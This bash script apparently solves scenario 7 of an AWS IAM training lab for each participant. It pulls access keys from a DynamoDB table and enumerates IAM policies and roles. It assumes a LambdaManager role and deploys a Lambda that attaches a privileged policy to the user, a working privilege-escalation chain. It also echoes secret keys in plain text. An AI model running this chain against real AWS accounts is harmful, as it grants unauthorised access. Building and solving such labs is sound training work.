#!/bin/bash
# Read data from DynamoDB
data_base=($(aws dynamodb scan --table-name users --profile $1))
user_email=($(echo ${data_base[@]} | jq .Items[].email.S | tr -d '"'))
userid=($(echo ${data_base[@]} | jq .Items[].userid.S | tr -d '"' | cut -d @ -f 1))
secret_key=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario7.M.secret_key.S | tr -d '"'))
access_key=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario7.M.access_key.S | tr -d '"'))
username=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario7.M.username.S | tr -d '"'))
final_policy_arn=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario7.M.final_policy_arn.S | tr -d '"'))
lambda_exec_rolearn=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario7.M.lambdaExecutioneRolearn.S | tr -d '"'))
lambdaname=($(echo ${data_base[@]} | jq .Items[].scenarios.M.scenario7.M.lambdaname.S | tr -d '"'))

# Creating backup files with aws credentials
if [ ! -f ~/.aws/config_bacup ]
  then
    cp ~/.aws/config ~/.aws/config_bacup
    cp ~/.aws/credentials ~/.aws/credentials_bacup
fi
echo "///////////////////////////////////"
echo "//         Scenario7             //"
echo "///////////////////////////////////"
# The passage of the 7th scenario by each user
for ((i = 0; i < ${#user_email[@]}; i++))
    do
        echo "------------------------------------------------------------------------"
        echo ${username[i]}": "${user_email[i]}": "${access_key[i]}": "${secret_key[i]}
        echo "***"
        echo "Configure profile scenario7_${userid[i]}"
        echo "access_key: ${access_key[i]}"
        echo "secret_key: ${secret_key[i]}"
        aws configure set aws_access_key_id ${access_key[i]} --profile scenario7_${userid[i]}
        aws configure set aws_secret_access_key ${secret_key[i]} --profile scenario7_${userid[i]}
        aws configure set region eu-central-1 --profile scenario7_${userid[i]}
        aws configure set output json --profile scenario7_${userid[i]}
        echo "***"
        echo "list-attached-user-policies"
        aws iam list-attached-user-policies --no-cli-pager --user-name ${username[i]} --profile scenario7_${userid[i]}
        echo "get-policy-version scenario7 v1"
        aws iam get-policy-version --no-cli-pager --policy-arn arn:aws:iam::190965603529:policy/scenario7-policy-${userid[i]} --version-id v1 --profile scenario7_${userid[i]}
        echo "list-roles"
        aws iam list-roles --no-cli-pager --profile scenario7_${userid[i]}
        echo "list-attached-role-policies for LambdaExecution-role"
        aws iam list-attached-role-policies --no-cli-pager --role-name scenario7-LambdaExecution-role-${userid[i]} --profile scenario7_${userid[i]}
        echo "list-attached-role-policies for LambdaManager-role"
        aws iam list-attached-role-policies --no-cli-pager --role-name scenario7-LambdaManager-role-${userid[i]} --profile scenario7_${userid[i]}
        echo "get-policy-version LambdaManager v1"
        aws iam get-policy-version --no-cli-pager --policy-arn arn:aws:iam::190965603529:policy/scenario7-LambdaManager-policy-${userid[i]} --version-id v1 --profile scenario7_${userid[i]}
        echo "assume role LambdaManager and add lambdaManager credentials"
        eval $(aws sts assume-role --no-cli-pager --role-arn arn:aws:iam::190965603529:role/scenario7/scenario7-LambdaManager-role-${userid[i]} --role-session-name lambdaManager --profile scenario7_${userid[i]} \
        --query 'join(``, [` aws configure --profile lambdaManager set aws_access_key_id `, Credentials.AccessKeyId,` ; `, ` aws configure --profile lambdaManager set aws_secret_access_key `, Credentials.SecretAccessKey, ` ; `,` aws configure --profile lambdaManager set aws_session_token `,Credentials.SessionToken])' --output text)
        echo "create lambda_function.py file"
        echo "import boto3" > lambda_function.py
        echo "def lambda_handler(event, context):" >> lambda_function.py
	      echo "    client = boto3.client('iam')" >> lambda_function.py
	      echo "    response = client.attach_user_policy(UserName = '${username[i]}', PolicyArn='${final_policy_arn[i]}')"  >> lambda_function.py
	      echo "    return response" >> lambda_function.py
        echo "zip lambda_function.py to lambda_function.py.zip"
        zip lambda_function.py.zip lambda_function.py
        echo "Create Sc7FinalLambda<userid> function"
        aws lambda create-function --no-cli-pager --function-name ${lambdaname[i]} --runtime python3.6 --role ${lambda_exec_rolearn[i]} --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --region eu-central-1 --profile lambdaManager
        echo "Invoke Sc7FinalLambda<userid> function"
        aws lambda invoke --function-name ${lambdaname[i]} out.txt --profile lambdaManager
        echo "wait 10s (invoke) ... "
        sleep 10s
        echo "Final list s3 buckets"
        aws s3 ls --profile scenario7_${userid[i]}
        echo "remove trash"
        rm out.txt lambda_function.py lambda_function.py.zip
        echo "Done"
        echo "------------------------------------------------------------------------"
    done